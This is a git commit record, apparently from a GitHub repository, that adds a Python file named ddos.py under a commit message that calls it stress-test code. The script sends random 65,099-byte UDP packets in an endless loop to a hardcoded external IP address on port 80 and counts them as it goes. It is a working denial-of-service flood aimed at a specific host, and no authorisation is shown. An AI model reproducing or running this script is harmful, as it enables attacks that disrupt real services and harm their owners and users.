03169154d49aab9d88dbab2b62f9157dcdb9db18
Jac678 <GitHub>
2025-10-10 11:38:50 +0800

    Initial commit: 添加压力测试相关代码

---
+++ ddos.py
@@ -0,0 +1,26 @@
+import os
+import socket
+import random
+from datetime import datetime
+ 
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+ 
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+ 
+bytes = random._urandom(65099)
+ 
+ip = "8.211.170.143"
+port = 80
+ 
+os.system("clear")
+ 
+sent = 0
+while True:
+    sock.sendto(bytes, (ip, port))
+    sent = sent + 1
+    print("已发送 %s 个数据包到 %s 端口 %d" % (sent, ip, port))
